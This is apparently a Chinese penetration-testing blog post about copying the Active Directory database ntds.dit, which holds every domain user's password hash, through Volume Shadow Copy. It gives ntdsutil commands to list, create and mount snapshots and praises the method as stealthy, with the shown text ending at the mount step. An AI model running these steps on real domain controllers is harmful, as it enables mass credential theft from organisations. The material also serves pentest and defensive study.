---
title: "Get Ntds"
date: 2019-09-19T15:37:54+08:00
lastmod: 2019-09-19T15:37:54+08:00
draft: false
tags: [域渗透]
categories: [内网渗透]
comment: true
---
Get Ntds
<!--more-->
# Get Ntds.dit

>>Ntds.dit是主要的AD数据库，包括有关域用户，组和组成员身份的信息。它还包括域中所有用户的密码哈希值。为了进一步保护密码哈希值，使用存储在SYSTEM注册表配置单元中的密钥对这些哈希值进行加密。

## Volume Shadow Copy(快照服务框架)

```
hash数量：所有用户
免杀：不需要
优点：
    获得信息全面
    简单高效
    无需下载ntds.dit，隐蔽性高
```
### ntdsutil

```
支持系统：
Server 2003
Server 2008
Server 2012
```
- 查询当前系统快照
```
ntdsutil snapshot "List All" quit quit
ntdsutil snapshot "List Mounted" quit quit
```
![](https://puui.qpic.cn/fans_admin/0/3_1452557490_1568879309708/0)

- 创建快照
```
ntdsutil snapshot "activate instance ntds" create quit quit
```
![](https://ae01.alicdn.com/kf/H2079eff136494ae89fff202b69c04a0dJ.jpg)

**guid为{c6548a26-aed9-41c4-966e-e34c4bf52ae3}**

- 挂载快照
```
ntdsutil snapshot "mount {c6548a26-aed9-41c4-966e-e34c4bf52ae3}" quit quit
```
![](https://ae01.alicdn.com/kf/H03f17d269a134fae9e05e0ecbd7e728eL.jpg)